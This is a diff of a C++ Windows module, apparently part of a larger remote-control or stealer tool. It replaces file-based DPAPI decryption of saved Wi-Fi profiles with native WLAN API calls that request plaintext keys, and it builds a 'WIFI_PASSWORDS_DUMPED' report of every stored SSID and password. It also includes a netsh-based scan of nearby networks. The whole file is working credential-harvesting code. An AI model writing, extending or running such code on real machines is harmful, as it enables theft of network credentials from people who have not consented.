@@ -1,133 +1,107 @@
 #include "WifiDumper.h"
 #include "../utils/Exec.h"
 #include <windows.h>
-#include <wincrypt.h>
-#include <shlobj.h>
-#include <filesystem>
-#include <regex>
-#include <fstream>
+#include <wlanapi.h>
+#include <objbase.h>
+#include <wtypes.h>
 #include <iostream>
 #include <vector>
 #include <sstream>
+#include <iomanip>
+#include <regex>
 
-#pragma comment(lib, "crypt32.lib")
+#pragma comment(lib, "wlanapi.lib")
 
 namespace wifi {
 
-    namespace fs = std::filesystem;
-
     namespace {
-        std::string decryptKeyMaterial(const std::string& hexKey) {
-            std::vector<BYTE> encryptedBytes;
-            for (size_t i = 0; i < hexKey.length(); i += 2) {
-                std::string byteString = hexKey.substr(i, 2);
-                encryptedBytes.push_back((BYTE)strtol(byteString.c_str(), nullptr, 16));
-            }
-
-            DATA_BLOB dataIn;
-            dataIn.cbData = (DWORD)encryptedBytes.size();
-            dataIn.pbData = encryptedBytes.data();
-            DATA_BLOB dataOut;
-
-            // Decrypt using DPAPI
-            if (CryptUnprotectData(&dataIn, NULL, NULL, NULL, NULL, 0, &dataOut)) {
-                std::string decrypted((char*)dataOut.pbData, dataOut.cbData);
-                LocalFree(dataOut.pbData);
-                return decrypted;
-            }
-            return "[DECRYPT FAILED]";
-        }
-
         std::string getTagValue(const std::string& content, const std::string& tag) {
-            // Try regex first
+            // Simple robust regex for extracting tag content: <tag>value</tag>
             std::regex re("<([a-zA-Z0-9_]+:)?" + tag + ">(.*?)</([a-zA-Z0-9_]+:)?" + tag + ">");
             std::smatch match;
             if (std::regex_search(content, match, re)) {
                 return match[2].str();
-            }
-            // Fallback for simple find
-            size_t start = content.find("<" + tag + ">");
-            if (start == std::string::npos) {
-                // Try with any prefix
-                size_t colonStart = content.find(":" + tag + ">");
-                if (colonStart != std::string::npos) {
-                    start = content.find_last_of('<', colonStart);
-                }
-            }
-            if (start != std::string::npos) {
-                size_t endTagStart = content.find("</", start);
-                size_t valueStart = content.find('>', start) + 1;
-                if (endTagStart != std::string::npos && endTagStart > valueStart) {
-                    return content.substr(valueStart, endTagStart - valueStart);
-                }
             }
             return "";
         }
     }
 
     std::string dumpWifiProfiles() {
-        std::string profilesPath = "C:\\ProgramData\\Microsoft\\Wlansvc\\Profiles\\Interfaces";
-        std::string report = "WIFI_PASSWORDS_DUMPED (XML Method):\n";
+        HANDLE hClient = NULL;
+        DWORD dwMaxClient = 2;
+        DWORD dwCurVersion = 0;
+        DWORD dwResult = 0;
+        std::string report = "WIFI_PASSWORDS_DUMPED (Native API):\n";
         report += "SSID                                     PASSWORD                       AUTH\n";
         report += "----------------------------------------------------------------------------------------------------\n";
 
-        if (!fs::exists(profilesPath)) {
-            return "WiFi profiles directory not found.";
+        dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);
+        if (dwResult != ERROR_SUCCESS) {
+            return "WIFI_DUMP_ERROR: Failed to open Wlan handle (Code: " + std::to_string(dwResult) + ")";
+        }
+
+        PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
+        dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
+        if (dwResult != ERROR_SUCCESS) {
+            WlanCloseHandle(hClient, NULL);
+            return "WIFI_DUMP_ERROR: Failed to enum interfaces.";
         }
 
         int count = 0;
-        try {
-            for (const auto& interfaceEntry : fs::directory_iterator(profilesPath)) {
-                if (!interfaceEntry.is_directory()) continue;
+        for (DWORD i = 0; i < pIfList->dwNumberOfItems; i++) {
+            WLAN_INTERFACE_INFO IfInfo = pIfList->InterfaceInfo[i];
+            PWLAN_PROFILE_INFO_LIST pProfileList = NULL;
 
-                for (const auto& profileEntry : fs::directory_iterator(interfaceEntry.path())) {
-                    if (profileEntry.path().extension() != ".xml") continue;
+            dwResult = WlanGetProfileList(hClient, &IfInfo.InterfaceGuid, NULL, &pProfileList);
+            if (dwResult != ERROR_SUCCESS) continue;
 
-                    std::ifstream file(profileEntry.path());
-                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+            for (DWORD j = 0; j < pProfileList->dwNumberOfItems; j++) {
+                WLAN_PROFILE_INFO ProfileInfo = pProfileList->ProfileInfo[j];
+                LPWSTR pProfileXml = NULL;
+                DWORD dwFlags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
+                DWORD dwGrantedAccess = 0;
 
-                    std::string ssid = getTagValue(content, "name");
-                    std::string auth = getTagValue(content, "authentication");
-                    std::string keyMaterial = getTagValue(content, "keyMaterial");
-                    std::string isProtected = getTagValue(content, "protected");
-                    std::string password = "[OPEN/NO PASSWORD]";
+                dwResult = WlanGetProfile(hClient, &IfInfo.InterfaceGuid, ProfileInfo.strProfileName, NULL, &pProfileXml, &dwFlags, &dwGrantedAccess);
+                if (dwResult == ERROR_SUCCESS) {
+                    // Convert WCHAR* to std::string
+                    int size_needed = WideCharToMultiByte(CP_UTF8, 0, pProfileXml, -1, NULL, 0, NULL, NULL);
+                    std::string xml(size_needed, 0);
+                    WideCharToMultiByte(CP_UTF8, 0, pProfileXml, -1, &xml[0], size_needed, NULL, NULL);
 
-                    if (!keyMaterial.empty()) {
-                        if (isProtected == "false") {
-                            password = keyMaterial;
-                        } else {
-                            password = decryptKeyMaterial(keyMaterial);
-                        }
-                    }
+                    std::string ssid = getTagValue(xml, "name");
+                    std::string auth = getTagValue(xml, "authentication");
+                    std::string key = getTagValue(xml, "keyMaterial");
+                    
+                    if (key.empty()) key = "[OPEN/NO PASSWORD]";
 
-                    // Format line
                     std::stringstream line;
-                    line << std::left << std::setw(40) << ssid.substr(0, 39) 
-                         << std::setw(30) << password.substr(0, 29) 
+                    line << std::left << std::setw(40) << ssid.substr(0, 39)
+                         << std::setw(30) << key.substr(0, 29)
                          << auth << "\n";
                     report += line.str();
                     count++;
+
+                    WlanFreeMemory(pProfileXml);
                 }
             }
-        } catch (...) {}
-
-        if (count == 0) {
-            return "No saved WiFi profiles found.";
+            if (pProfileList) WlanFreeMemory(pProfileList);
         }
 
+        if (pIfList) WlanFreeMemory(pIfList);
+        WlanCloseHandle(hClient, NULL);
+
+        if (count == 0) return "No saved WiFi profiles found.";
+        
         report += "\n\nTotal networks: " + std::to_string(count);
         return report;
     }
 
     std::string scanAvailableWifi() {
-        // Use netsh equivalent to Python's subprocess.check_output
         std::string output = utils::RunCommand("netsh wlan show networks mode=Bssid");
         if (output.empty()) return "WIFI_SCAN_ERROR: Failed to run netsh.";
 
-        // Basic parsing for report
         std::stringstream ss(output);
         std::string line;
-        
         std::string report = "WIFI_SCAN_RESULTS:\n";
         report += "SSID                                     SIGNAL    AUTH            ENCRYPTION\n";
         report += "----------------------------------------------------------------------------------------------------\n";
@@ -140,9 +114,6 @@ namespace wifi {
         } current;
 
         std::vector<Network> networks;
-        
-        // Manual parsing similar to Python's regex split
-        // This is a simplified parser
         while (std::getline(ss, line)) {
             if (line.find("SSID") != std::string::npos && line.find(":") != std::string::npos) {
                  if (!current.ssid.empty()) {
@@ -151,7 +122,6 @@ namespace wifi {
                  }
                  size_t col = line.find(":");
                  current.ssid = line.substr(col + 1);
-                 // Trim
                  current.ssid.erase(0, current.ssid.find_first_not_of(" \t\r\n"));
                  current.ssid.erase(current.ssid.find_last_not_of(" \t\r\n") + 1);
                  if (current.ssid.empty()) current.ssid = "[Hidden SSID]";
